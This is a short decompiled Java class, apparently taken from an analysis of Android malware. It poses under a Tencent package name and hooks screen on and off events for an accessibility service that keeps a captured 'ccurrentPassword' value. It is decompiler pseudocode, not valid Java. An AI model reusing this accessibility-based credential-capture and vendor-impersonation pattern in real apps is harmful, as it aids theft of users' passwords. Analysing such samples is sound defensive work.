package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AccessibilityServiceCore_18
 * Original: Lcom/tencent/tunesxconcerningn1012$18;
 */
class AccessibilityServiceCore_18 implements ScreenStatusMonitor; {

    // === FIELDS ===
    final AccessibilityServiceCore this$0;

    // === METHODS ===

     void Constructor(AccessibilityServiceCore param0) {
        v0.this$0 = v1;
        // new Object()
        return;
    }

    public void onScreenOff() {
        v0 = "";
        AccessibilityServiceCore.ccurrentPassword = "";
        return;
    }

    public void onScreenOn() {
        return;
    }

    public void userPresent() {
        v0 = v1.this$0;
        AccessibilityServiceCore.access$500(v0);
        return;
    }
}
